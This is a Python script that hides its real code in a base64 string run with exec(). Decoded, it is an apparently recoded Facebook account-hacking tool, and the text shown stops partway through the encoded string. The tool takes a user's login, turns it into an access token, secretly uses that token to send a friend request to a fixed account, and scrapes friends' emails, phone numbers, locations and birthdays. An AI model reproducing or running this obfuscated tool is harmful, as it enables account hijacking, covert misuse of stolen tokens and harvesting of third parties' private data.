import base64
exec(base64.b64decode('IyEvdXNyL2Jpbi9weXRob24yCiMgY29kaW5nPXV0Zi04CgppbXBvcnQgb3Msc3lzLHRpbWUsZGF0ZXRpbWUscmFuZG9tLGhhc2hsaWIscmUsdGhyZWFkaW5nLGpzb24sZ2V0cGFzcyx1cmxsaWIsY29va2llbGliCmZyb20gbXVsdGlwcm9jZXNzaW5nLnBvb2wgaW1wb3J0IFRocmVhZFBvb2wKdHJ5OgoJaW1wb3J0IG1lY2hhbml6ZQpleGNlcHQgSW1wb3J0RXJyb3I6Cglvcy5zeXN0ZW0oInBpcDIgaW5zdGFsbCBtZWNoYW5pemUiKQp0cnk6CglpbXBvcnQgcmVxdWVzdHMKZXhjZXB0IEltcG9ydEVycm9yOgoJb3Muc3lzdGVtKCJwaXAyIGluc3RhbGwgcmVxdWVzdHMiKQpmcm9tIHJlcXVlc3RzLmV4Y2VwdGlvbnMgaW1wb3J0IENvbm5lY3Rpb25FcnJvcgpmcm9tIG1lY2hhbml6ZSBpbXBvcnQgQnJvd3NlcgoKIy1TZXR0aW5nLSMKIyMjIyMjIyMKcmVsb2FkKHN5cykKc3lzLnNldGRlZmF1bHRlbmNvZGluZygndXRmOCcpCmJyID0gbWVjaGFuaXplLkJyb3dzZXIoKQpici5zZXRfaGFuZGxlX3JvYm90cyhGYWxzZSkKYnIuc2V0X2hhbmRsZV9yZWZyZXNoKG1lY2hhbml6ZS5faHR0cC5IVFRQUmVmcmVzaFByb2Nlc3NvcigpLG1heF90aW1lPTEpCmJyLmFkZGhlYWRlcnMgPSBbKCdVc2VyLUFnZW50JywgJ09wZXJhLzkuODAgKEFuZHJvaWQ7IE9wZXJhIE1pbmkvMzYuMi4yMjU0LzExOS4xMzI7IFU7IGlkKSBQcmVzdG8vMi4xMi40MjMgVmVyc2lvbi8xMi4xNicpXQoKIy1leGl0LSMKZGVmIGV4aXQoKToKCW9zLnN5c3RlbSgnY2xlYXInKQoJcHJpbnQgIlwwMzNbMTs5MW1bIV0gQ2xvc2luZyB0aGUgdG9vbC4uLiIKCW9zLnN5c3RlbSgnc2xlZXAgMyAmJiBjbGVhcicpCglvcy5zeXN0ZW0oJ3hkZy1vcGVuIGh0dHBzOi8vd2ViLmZhY2Vib29rLmNvbS9CQVlVLlQ0Tkc5VUgnKQoJb3Muc3lzLmV4aXQoKQogICAgICAgIHRvb2xfbWFpbl9mdW5jdGlvbigpCgojLUFuaW1hdGlvbi0jCmRlZiBta2Rpcih6KToKICAgICAgICBmb3IgZSBpbiB6ICsgJ1xuJzoKICAgICAgICAgICAgICAgIHN5cy5zdGRvdXQud3JpdGUoZSkKICAgICAgICAgICAgICAgIHN5cy5zdGRvdXQuZmx1c2goKQogICAgICAgICAgICAgICAgdGltZS5zbGVlcCgwMDAwMC4xKQoKIyMjIyMgTE9HTyAjIyMjIwpsb2dvID0gIiIiClwwMzNbMTs5MW3ilIzilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilJBcMDMzWzE7OTFtCuKUgiAgIOKWhOKWhOKWhOKWhOKWhOKWhCAgICAgICAgICAgICAgICAgICAgICDiloggICAgICAgICAgICAgICAgICAgIOKWiCAgICAgICAg4pSCXDAzM1sxOzkxbQrilIIgICDiloggICAgICAg4paE4paE4paEICAgIOKWhOKWhOKWhCAgICDiloTiloTiloQgICDilojiloTiloTiloQgICAg4paE4paE4paEICAgIOKWhOKWhOKWhCAgIOKWiCAgIOKWhCAgICDilIJcMDMzWzE7OTFtCuKUgiAgIOKWiOKWhOKWhOKWhOKWhOKWhCDiloAgICDiloggIOKWiOKWgCAg4paAICDilojiloAgIOKWiCAg4paI4paAIOKWgOKWiCAg4paI4paAIOKWgOKWiCAg4paI4paAIOKWgOKWiCAg4paIIOKWhOKWgCAgICAg4pSCXDAzM1sxOzkxbQrilIIgICDiloggICAgICDiloTiloDiloDiloDiloggIOKWiCAgICAgIOKWiOKWgOKWgOKWgOKWgCAg4paIICAg4paIICDiloggICDiloggIOKWiCAgIOKWiCAg4paI4paA4paIICAgICAg4pSCXDAzM1sxOzkxbQrilIIgICDiloggICAgICDiloDiloTiloTiloDiloggIOKWgOKWiOKWhOKWhOKWgCAg4paA4paI4paE4paE4paAICDilojilojiloTilojiloAgIOKWgOKWiOKWhOKWiOKWgCAg4paA4paI4paE4paI4paAICDiloggIOKWgOKWhCAgICDilIJcMDMzWzE7OTFtCuKUlOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUmHxcMDMzWzE7OTFtClwwMzNbMTs5N23ilZTilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZcKXDAzM1sxOzk3beKVkVwwMzNbMTs5M20qIFwwMzNbMTs5N21UZWFtICAgIFwwMzNbMTs5MW06IFwwMzNbMTs5Mm1FYWdsZSBSZXBvcnRpbmcgQ29tbWlzaW9uICBcMDMzWzE7OTdtICAgICAgICAgICAgICAgICAgICAgIOKVkQpcMDMzWzE7OTdt4pWRXDAzM1sxOzkzbSogXDAzM1sxOzk3bVJlY29kZSAgXDAzM1sxOzkxbTogXDAzM1sxOzk2bVN0ZXZlbCBFaWtpY2hpICBcMDMzWzE7OTdtICAgICAgICAgICAgICAgICAgICAgIOKVkQpcMDMzWzE7OTdt4pWRXDAzM1sxOzkzbSogXDAzM1sxOzk3bUdpdGh1YiAgXDAzM1sxOzkxbTogXDAzM1sxOzk2bWh0dHBzOi8vZ2l0aHViLmNvbS9LYW1aMFwwMzNbMTs5N20gICAgICAgICAgICAgICAgICAgICAgICAg4pWRClwwMzNbMTs5N23ilZFcMDMzWzE7OTNtKiBcMDMzWzE7OTdtRkIgICAgICBcMDMzWzE7OTFtOiBcMDMzWzE7OTJtXDAzM1s0bWh0dHBzOi8vd2ViLmZhY2Vib29rLmNvbS9CNFlVLlRBTkc5VUggXDAzM1swbVwwMzNbMTs5N20gICAgICAgICAgIOKVkQpcMDMzWzE7OTdt4pWRXDAzM1sxOzkzbSogXDAzM1sxOzk3bUNyZWRpdHMgXDAzM1sxOzkxbTogXDAzM1sxOzk2bVtFYWdsZUN5YmVyXSBcMDMzWzE7OTdtICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg4pWRClwwMzNbMTs5N23ilZFcMDMzWzE7OTNtKiBcMDMzWzE7OTdtTm90aWNlIFwwMzNbMTs5MW0gOiBcMDMzWzE7OTZtVGhpcyBpcyBub3QgbXkgb3duIHdvcmssIGkganVzdCByZWNvZGVkIGl0LiBcMDMzWzE7OTdtICAgICDilZEKXDAzM1sxOzk3beKVkVwwMzNbMTs5M20qIFwwMzNbMTs5N21WZXJzaW9uIFwwMzNbMTs5MW06IFwwMzNbMTs5Mm1cMDMzWzRtMS4xLjBcMDMzWzBtICAgICAgICAgICAgICAgICAgICAgICAgXDAzM1sxOzk3bSAgICAgICAgICAgICAgICAgICAg4pWRClwwMzNbMTs5N23ilZrilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZ0iIiIKCiMgbG9hZCAjCmRlZiBsb2FkKCk6Cgl0aWxvYWQgPSBbJy4gICAnLCcuLiAgJywnLi4uICddCglmb3IgbyBpbiB0aWxvYWQ6CgkJcHJpbnQoIlxyXDAzM1sxOzkxbVvil49dIFwwMzNbMTs5Mm1Mb2FkaW5nIFwwMzNbMTs5N20iK28pLDtzeXMuc3Rkb3V0LmZsdXNoKCk7dGltZS5zbGVlcCgxKQoKYmFjayA9IDAKdGhyZWFkcyA9IFtdCnN1Y2Vzc2Z1bCA9IFtdCmNoZWNrcG9pbnQgPSBbXQpva3MgPSBbXQphY3Rpb25fZmFpbGVkID0gW10KaWRmcmllbmRzID0gW10KaWRmcm9tZnJpZW5kcyA9IFtdCm1lbWJlcl9pZCA9IFtdCmVtYWlsPSBbXQpudW1iZXIgPSBbXQppZCA9IFtdCmVtID0gW10KZW1haWxfZnJvbV9mcmllbmRzID0gW10KaHAgPSBbXQpocGZyb21mcmllbmRzID0gW10KcmVhY3Rpb24gPSBbXQpyZWFjdGlvbmdyb3VwID0gW10KY29tbWVudCA9IFtdCmdyb3VwX2NvbW1lbnQgPSBbXQpsaXN0Z3JvdXAgPSBbXQp2dWxub3QgPSAiXDAzM1szMW1Ob3QgVnVsbiIKdnVsbiA9ICJcMDMzWzMybVZ1bG4iCgojIyMjIyBjaG9pY2VzIExvZ2luICMjIyMjCmRlZiB0b29sX21haW5fZnVuY3Rpb24oKToKCW9zLnN5c3RlbSgnY2xlYXInKQoJcHJpbnQgbG9nbwoJcHJpbnQgIlwwMzNbMTs5N23ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5Mm0xLlwwMzNbMTs5N20gTm9ybWFsIGxvZ2luIgoJcHJpbnQgIlwwMzNbMTs5N23ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5Mm0yLlwwMzNbMTs5N20gVG9rZW5zIGxvZ2luIgoJcHJpbnQgIlwwMzNbMTs5N23ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5MW0wLlwwMzNbMTs5N20gRXhpdCIKCXByaW50ICJcMDMzWzE7OTdt4pWRIgoJbG9naW5fbWV0aG9kID0gcmF3X2lucHV0KCJcMDMzWzE7OTdt4pWa4pWQXDAzM1sxOzkxbT4+PiBcMDMzWzE7OTdtIikKCWlmIGxvZ2luX21ldGhvZCA9PSIiOgoJCXByaW50IlwwMzNbMTs5MW1bIV0gV3JvbmcgaW5wdXQiCgkJZXhpdCgpCgllbGlmIGxvZ2luX21ldGhvZCA9PSIxIjoKCQlsb2dpbigpCgllbGlmIGxvZ2luX21ldGhvZCA9PSIyIjoKCQlmYnRva2VuKCkKCWVsaWYgbG9naW5fbWV0aG9kID09IjAiOgoJCWV4aXQoKQoJZWxzZToKCQlwcmludCJcMDMzWzE7OTFtWyFdIFdyb25nIGlucHV0IgoJCWV4aXQoKQoKIyMjIyMgTE9HSU4gIyMjIyMKIz09PT09PT09PT09PT09PT0jCmRlZiBsb2dpbigpOgoJb3Muc3lzdGVtKCdjbGVhcicpCgl0cnk6CgkJZmJfdG9rZW4gPSBvcGVuKCdsb2dpbi50eHQnLCdyJykKCQltZW51KCkKCWV4Y2VwdCAoS2V5RXJyb3IsSU9FcnJvcik6CgkJb3Muc3lzdGVtKCdjbGVhcicpCgkJcHJpbnQgbG9nbwoJCXByaW50KCdcMDMzWzE7OTFtW+KYhl0gXDAzM1sxOzkybUZBQ0VCT09LIExPR0lOIFwwMzNbMTs5MW1b4piGXScpCgkJaWQgPSByYXdfaW5wdXQoJ1wwMzNbMTs5MW1bK10gXDAzM1sxOzM2bUlEXDAzM1sxOzk3bXxcMDMzWzE7OTZtRW1haWxcMDMzWzE7OTdtIFwwMzNbMTs5MW06XDAzM1sxOzkybSAnKQoJCXB3ZCA9IGdldHBhc3MuZ2V0cGFzcygnXDAzM1sxOzkxbVsrXSBcMDMzWzE7MzZtUGFzc3dvcmQgXDAzM1sxOzkxbTpcMDMzWzE7OTJtICcpCgkJbG9hZCgpCgkJdHJ5OgoJCQlici5vcGVuKCdodHRwczovL20uZmFjZWJvb2suY29tJykKCQlleGNlcHQgbWVjaGFuaXplLlVSTEVycm9yOgoJCQlwcmludCJcblwwMzNbMTs5MW1bIV0gTm8gY29ubmVjdGlvbiIKCQkJZXhpdCgpCgkJYnIuX2ZhY3RvcnkuaXNfaHRtbCA9IFRydWUKCQlici5zZWxlY3RfZm9ybShucj0wKQoJCWJyLmZvcm1bJ2VtYWlsJ10gPSBpZAoJCWJyLmZvcm1bJ3Bhc3MnXSA9IHB3ZAoJCWJyLnN1Ym1pdCgpCgkJdXJsID0gYnIuZ2V0dXJsKCkKCQlpZiAnc2F2ZS1kZXZpY2UnIGluIHVybDoKCQkJdHJ5OgoJCQkJc2lnPSAnYXBpX2tleT04ODJhODQ5MDM2MWRhOTg3MDJiZjk3YTAyMWRkYzE0ZGNyZWRlbnRpYWxzX3R5cGU9cGFzc3dvcmRlbWFpbD0nK2lkKydmb3JtYXQ9SlNPTmdlbmVyYXRlX21hY2hpbmVfaWQ9MWdlbmVyYXRlX3Nlc3Npb25fY29va2llcz0xbG9jYWxlPWVuX1VTbWV0aG9kPWF1dGgubG9naW5wYXNzd29yZD0nK3B3ZCsncmV0dXJuX3NzbF9yZXNvdXJjZXM9MHY9MS4wNjJmOGNlOWY3NGIxMmY4NGMxMjNjYzIzNDM3YTRhMzInCgkJCQlkYXRhID0geyJhcGlfa2V5IjoiODgyYTg0OTAzNjFkYTk4NzAyYmY5N2EwMjFkZGMxNGQiLCJjcmVkZW50aWFsc190eXBlIjoicGFzc3dvcmQiLCJlbWFpbCI6aWQsImZvcm1hdCI6IkpTT04iLCAiZ2VuZXJhdGVfbWFjaGluZV9pZCI6IjEiLCJnZW5lcmF0ZV9zZXNzaW9uX2Nvb2tpZXMiOiIxIiwibG9jYWxlIjoiZW5fVVMiLCJtZXRob2QiOiJhdXRoLmxvZ2luIiwicGFzc3dvcmQiOnB3ZCwicmV0dXJuX3NzbF9yZXNvdXJjZXMiOiIwIiwidiI6IjEuMCJ9CgkJCQl4PWhhc2hsaWIubmV3KCJtZDUiKQoJCQkJeC51cGRhdGUoc2lnKQoJCQkJYT14LmhleGRpZ2VzdCgpCgkJCQlkYXRhLnVwZGF0ZSh7J3NpZyc6YX0pCgkJCQl1cmwgPSAiaHR0cHM6Ly9hcGkuZmFjZWJvb2suY29tL3Jlc3RzZXJ2ZXIucGhwIgoJCQkJcj1yZXF1ZXN0cy5nZXQodXJsLHBhcmFtcz1kYXRhKQoJCQkJej1qc29uLmxvYWRzKHIudGV4dCkKCQkJCXBpY2sgPSBvcGVuKCJsb2dpbi50eHQiLCAndycpCgkJCQlwaWNrLndyaXRlKHpbJ2FjY2Vzc190b2tlbiddKQoJCQkJcGljay5jbG9zZSgpCgkJCQlwcmludCAnXG5cMDMzWzE7OTFtW1wwMzNbMTs5Nm3inJNcMDMzWzE7OTFtXSBcMDMzWzE7OTJtTG9naW4gc3VjY2Vzc2Z1bGx5JwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL21lL2ZyaWVuZHM/bWV0aG9kPXBvc3QmdWlkcz1nd2ltdXNhMyZhY2Nlc3NfdG9rZW49Jyt6WydhY2Nlc3NfdG9rZW4nXSkKCQkJCW1lbnUoKQoJCQlleGNlcHQgcmVxdWVzdHMuZXhjZXB0aW9ucy5Db25uZWN0aW9uRXJyb3I6CgkJCQlwcmludCJcblwwMzNbMTs5MW1bIV0gTm8gY29ubmVjdGlvbiIKCQkJCWV4aXQoKQoJCWlmICdjaGVja3BvaW50JyBpbiB1cmw6CgkJCXByaW50KCJcblwwMzNbMTs5MW1bIV0gXDAzM1sxOzkzbUFjY291bnQgQ2hlY2twb2ludCIpCgkJCW9zLnN5c3RlbSgncm0gLXJmIGxvZ2luLnR4dCcpCgkJCXRpbWUuc2xlZXAoMSkKCQkJZXhpdCgpCgkJZWxzZToKCQkJcHJpbnQoIlxuXDAzM1sxOzkxbVshXSBMb2dpbiBGYWlsZWQiKQoJCQlvcy5zeXN0ZW0oJ3JtIC1yZiBsb2dpbi50eHQnKQoJCQl0aW1lLnNsZWVwKDAuMDEpCgkJCWxvZ2luKCkKCiMjIyMjIFRPS0VOICMjIyMjCmRlZiBmYnRva2VuKCk6Cglvcy5zeXN0ZW0oJ2NsZWFyJykKCXByaW50IGxvZ28KCWZiX3Rva2VuID0gcmF3X2lucHV0KCJcMDMzWzE7OTFtWz9dIFwwMzNbMTs5Mm1Ub2tlblwwMzNbMTs5MW0gOiBcMDMzWzE7OTdtIikKCXRyeToKCQlvdHcgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL21lP2FjY2Vzc190b2tlbj0nK2ZiX3Rva2VuKQoJCWEgPSBqc29uLmxvYWRzKG90dy50ZXh0KQoJCWZiX25hbWUgPSBhWyduYW1lJ10KCQlwaWNrID0gb3BlbigibG9naW4udHh0IiwgJ3cnKQoJCXBpY2sud3JpdGUoZmJfdG9rZW4pCgkJcGljay5jbG9zZSgpCgkJbWVudSgpCglleGNlcHQgS2V5RXJyb3I6CgkJcHJpbnQgIlwwMzNbMTs5MW1bIV0gV3JvbmciCgkJZSA9IHJhd19pbnB1dCgiXDAzM1sxOzkxbVs/XSBcMDMzWzE7OTJtV2FudCB0byBwaWNrIHVwIHRva2VuP1wwMzNbMTs5N21beS9uXTogIikKCQlpZiBlID09IiI6CgkJCWV4aXQoKQoJCWVsaWYgZSA9PSJ5IjoKCQkJbG9naW4oKQoJCWVsc2U6CgkJCWV4aXQoKQoKIyMjIyMgTUVOVSAjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKZGVmIG1lbnUoKToKCW9zLnN5c3RlbSgnY2xlYXInKQoJdHJ5OgoJCWZiX3Rva2VuPW9wZW4oJ2xvZ2luLnR4dCcsJ3InKS5yZWFkKCkKCWV4Y2VwdCBJT0Vycm9yOgoJCW9zLnN5c3RlbSgnY2xlYXInKQoJCXByaW50IlwwMzNbMTs5MW1bIV0gVG9rZW4gbm90IGZvdW5kIgoJCW9zLnN5c3RlbSgncm0gLXJmIGxvZ2luLnR4dCcpCgkJdGltZS5zbGVlcCgwLjAxKQoJCWxvZ2luKCkKCXRyeToKCQlvdHcgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL21lP2FjY2Vzc190b2tlbj0nK2ZiX3Rva2VuKQoJCWEgPSBqc29uLmxvYWRzKG90dy50ZXh0KQoJCWZiX25hbWUgPSBhWyduYW1lJ10KCQlpZCA9IGFbJ2lkJ10KCWV4Y2VwdCBLZXlFcnJvcjoKCQlvcy5zeXN0ZW0oJ2NsZWFyJykKCQlwcmludCJcMDMzWzE7OTFtWyFdIFwwMzNbMTs5M21BY2NvdW50IENoZWNrcG9pbnQiCgkJb3Muc3lzdGVtKCdybSAtcmYgbG9naW4udHh0JykKCQl0aW1lLnNsZWVwKDAuMDEpCgkJbG9naW4oKQoJZXhjZXB0IHJlcXVlc3RzLmV4Y2VwdGlvbnMuQ29ubmVjdGlvbkVycm9yOgoJCXByaW50IlwwMzNbMTs5MW1bIV0gTm8gY29ubmVjdGlvbiIKCQlleGl0KCkKCW9zLnN5c3RlbSgicmVzZXQiKQoJcHJpbnQgbG9nbwoJcHJpbnQgIuKVkVwwMzNbMTs5MW1bXDAzM1sxOzk2beKck1wwMzNbMTs5MW1dXDAzM1sxOzk3bSBOYW1lIFwwMzNbMTs5MW06IFwwMzNbMTs5Mm0iK2ZiX25hbWUrIlwwMzNbMTs5N20iCglwcmludCAi4pWRXDAzM1sxOzkxbVtcMDMzWzE7OTZt4pyTXDAzM1sxOzkxbV1cMDMzWzE7OTdtIElEICAgXDAzM1sxOzkxbTogXDAzM1sxOzkybSIraWQKCXByaW50ICJcMDMzWzE7OTdt4pWaIis0MCoi4pWQIgoJcHJpbnQgIlwwMzNbMTs5N23ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5Mm0xLlwwMzNbMTs5N20gVXNlciBpbmZvcm1hdGlvbiIKCXByaW50ICJcMDMzWzE7OTdt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTJtMi5cMDMzWzE7OTdtIEdldCBJZC9lbWFpbC9ocCIKCXByaW50ICJcMDMzWzE7OTdt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTJtMy5cMDMzWzE7OTdtIEhhY2sgZmFjZWJvb2sgYWNjb3VudCAgICAgICAgICAgICAgICIKCXByaW50ICJcMDMzWzE7OTdt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTJtNC5cMDMzWzE7OTdtIEJvdCAgICAgICAiCglwcmludCAiXDAzM1sxOzk3beKVkS0tXDAzM1sxOzkxbT4gXDAzM1sxOzkybTUuXDAzM1sxOzk3bSBPdGhlcnMgICAgICAgICAgICIKCXByaW50ICJcMDMzWzE7OTdt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTJtNi5cMDMzWzE7OTdtIFNob3cgdG9rZW4gICAgICAgICAgICIKICAgICAgICBwcmludCAiXDAzM1sxOzk3beKVkS0tXDAzM1sxOzkxbT4gXDAzM1sxOzkybTcuXDAzM1sxOzk3bSBVcGRhdGUgICAgICAgICAgICIKCXByaW50ICJcMDMzWzE7OTdt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTJtOC5cMDMzWzE7OTdtIERlbGV0ZSB0cmFzaCAgICAgICAgICAiCglwcmludCAiXDAzM1sxOzk3beKVkS0tXDAzM1sxOzkxbT4gXDAzM1sxOzkybTkuXDAzM1sxOzk3bSBMb2dPdXQgICAgICAgICAgICAiCglwcmludCAiXDAzM1sxOzk3beKVkS0tXDAzM1sxOzkxbT4gXDAzM1sxOzkxbTAuXDAzM1sxOzk3bSBFeGl0IHRoZSBwcm9ncmFtcyAgICAgICAgICAiCglwcmludCAi4pWRIgoJY2hvaWNlcygpCiMtCmRlZiBjaG9pY2VzKCk6CglwaWNrID0gcmF3X2lucHV0KCJcMDMzWzE7OTdt4pWa4pWQXDAzM1sxOzkxbT4+PiBcMDMzWzE7OTdtIikKCWlmIHBpY2sgPT0iIjoKCQlwcmludCAiXDAzM1sxOzkxbVshXSBXcm9uZyBpbnB1dCIKCQljaG9pY2VzKCkKCWVsaWYgcGljayA9PSIxIjoKCQlpbmZvcm1hdGlvbigpCgllbGlmIHBpY2sgPT0iMiI6CgkJZHVtcCgpCgllbGlmIHBpY2sgPT0iMyI6CgkJbWVudV9oYWNrKCkKCWVsaWYgcGljayA9PSI0IjoKCQltZW51X2JvdCgpCgllbGlmIHBpY2sgPT0iNSI6CgkJZnVuYygpCgllbGlmIHBpY2sgPT0iNiI6CgkJb3Muc3lzdGVtKCdjbGVhcicpCgkJcHJpbnQgbG9nbwoJCWZiX3Rva2VuPW9wZW4oJ2xvZ2luLnR4dCcsJ3InKS5yZWFkKCkKCQlwcmludCAiXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtWW91ciB0b2tlblwwMzNbMTs5MW0gOlwwMzNbMTs5N20gIitmYl90b2tlbgoJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCgkJbWVudSgpCiAgICAgICAgZWxpZiBwaWNrID09IjciOgogICAgICAgICAgICAgICAgb3Muc3lzdGVtKCdjbGVhcicpCiAgICAgICAgICAgICAgICBwcmludCBsb2dvCiAgICAgICAgICAgICAgICBwcmludCA0MCAqICdcMDMzWzE7OTdtXHhlMlx4OTVceDkwJwogICAgICAgICAgICAgICAgb3Muc3lzdGVtKCdnaXQgcHVsbCBvcmlnaW4gbWFzdGVyJykKICAgICAgICAgICAgICAgIHJhd19pbnB1dCgnXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXScpCiAgICAgICAgICAgICAgICBtZW51KCkKCWVsaWYgcGljayA9PSI4IjoKCQlvcy5yZW1vdmUoJ291dCcpCgllbGlmIHBpY2sgPT0iOSI6CgkJb3Muc3lzdGVtKCdybSAtcmYgbG9naW4udHh0JykKCQlvcy5zeXN0ZW0oJ3hkZy1vcGVuIGh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9yaXp6Lm1hZ2l6eicpCgkJZXhpdCgpCgllbGlmIHBpY2sgPT0iMCI6CgkJZXhpdCgpCgllbHNlOgoJCXByaW50ICJcMDMzWzE7OTFtWyFdIFdyb25nIGlucHV0IgoJCWNob2ljZXMoKQoKIyMjIyMgSU5GTyAjIyMjIwpkZWYgaW5mb3JtYXRpb24oKToKCW9zLnN5c3RlbSgnY2xlYXInKQoJdHJ5OgoJCWZiX3Rva2VuPW9wZW4oJ2xvZ2luLnR4dCcsJ3InKS5yZWFkKCkKCWV4Y2VwdCBJT0Vycm9yOgoJCXByaW50IlwwMzNbMTs5MW1bIV0gVG9rZW4gbm90IGZvdW5kIgoJCW9zLnN5c3RlbSgncm0gLXJmIGxvZ2luLnR4dCcpCgkJdGltZS5zbGVlcCgwLjAxKQoJCWxvZ2luKCkKCW9zLnN5c3RlbSgnY2xlYXInKQoJcHJpbnQgbG9nbwoJYWlkID0gcmF3X2lucHV0KCdcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1FbnRlciBJRFwwMzNbMTs5N20vXDAzM1sxOzkybU5hbWVcMDMzWzE7OTFtIDogXDAzM1sxOzk3bScpCglta2RpcignXDAzM1sxOzkxbVvinLpdIFwwMzNbMTs5Mm1XYWl0IGEgbWludXRlIFwwMzNbMTs5N20uLi4nKQoJciA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vbWUvZnJpZW5kcz9hY2Nlc3NfdG9rZW49JytmYl90b2tlbikKCXRyeXkgPSBqc29uLmxvYWRzKHIudGV4dCkKCWZvciBpIGluIHRyeXlbJ2RhdGEnXToKCQlpZiBhaWQgaW4gaVsnbmFtZSddIG9yIGFpZCBpbiBpWydpZCddOgoJCQl4ID0gcmVxdWVzdHMuZ2V0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8iK2lbJ2lkJ10rIj9hY2Nlc3NfdG9rZW49IitmYl90b2tlbikKCQkJeiA9IGpzb24ubG9hZHMoeC50ZXh0KQoJCQlwcmludCA0MioiXDAzM1sxOzk3beKVkCIKCQkJdHJ5OgoJCQkJcHJpbnQgJ1wwMzNbMTs5MW1b4p65XSBcMDMzWzE7OTJtTmFtZVwwMzNbMTs5N20gICAgICAgICAgOiAnK3pbJ25hbWUnXQoJCQlleGNlcHQgS2V5RXJyb3I6IHByaW50ICdcMDMzWzE7OTFtWz9dIFwwMzNbMTs5Mm1OYW1lXDAzM1sxOzk3bSAgICAgICAgICA6IFwwMzNbMTs5MW1Ob3QgZm91bmQnCgkJCXRyeToKCQkJCXByaW50ICdcMDMzWzE7OTFtW+KeuV0gXDAzM1sxOzkybUlEXDAzM1sxOzk3bSAgICAgICAgICAgIDogJyt6WydpZCddCgkJCWV4Y2VwdCBLZXlFcnJvcjogcHJpbnQgJ1wwMzNbMTs5MW1bP10gXDAzM1sxOzkybUlEXDAzM1sxOzk3bSAgICAgICAgICAgIDogXDAzM1sxOzkxbU5vdCBmb3VuZCcKCQkJdHJ5OgoJCQkJcHJpbnQgJ1wwMzNbMTs5MW1b4p65XSBcMDMzWzE7OTJtRW1haWxcMDMzWzE7OTdtICAgICAgICAgOiAnK3pbJ2VtYWlsJ10KCQkJZXhjZXB0IEtleUVycm9yOiBwcmludCAnXDAzM1sxOzkxbVs/XSBcMDMzWzE7OTJtRW1haWxcMDMzWzE7OTdtICAgICAgICAgOiBcMDMzWzE7OTFtTm90IGZvdW5kJwoJCQl0cnk6CgkJCQlwcmludCAnXDAzM1sxOzkxbVvinrldIFwwMzNbMTs5Mm1UZWxlcGhvbmVcMDMzWzE7OTdtICAgICA6ICcrelsnbW9iaWxlX3Bob25lJ10KCQkJZXhjZXB0IEtleUVycm9yOiBwcmludCAnXDAzM1sxOzkxbVs/XSBcMDMzWzE7OTJtVGVsZXBob25lXDAzM1sxOzk3bSAgICAgOiBcMDMzWzE7OTFtTm90IGZvdW5kJwoJCQl0cnk6CgkJCQlwcmludCAnXDAzM1sxOzkxbVvinrldIFwwMzNbMTs5Mm1Mb2NhdGlvblwwMzNbMTs5N20gICAgICA6ICcrelsnbG9jYXRpb24nXVsnbmFtZSddCgkJCWV4Y2VwdCBLZXlFcnJvcjogcHJpbnQgJ1wwMzNbMTs5MW1bP10gXDAzM1sxOzkybUxvY2F0aW9uXDAzM1sxOzk3bSAgICAgIDogXDAzM1sxOzkxbU5vdCBmb3VuZCcKCQkJdHJ5OgoJCQkJcHJpbnQgJ1wwMzNbMTs5MW1b4p65XSBcMDMzWzE7OTJtRGF0ZSBvZiBiaXJ0aFwwMzNbMTs5N20gOiAnK3pbJ2JpcnRoZGF5J10KCQkJZXhjZXB0IEtleUVycm9yOiBwcmludCAnXDAzM1sxOzkxbVs/XSBcMDMzWzE7OTJtRGF0ZSBvZiBiaXJ0aFwwMzNbMTs5N20gOiBcMDMzWzE7OTFtTm90IGZvdW5kJwoJCQl0cnk6CgkJCQlwcmludCAnXDAzM1sxOzkxbV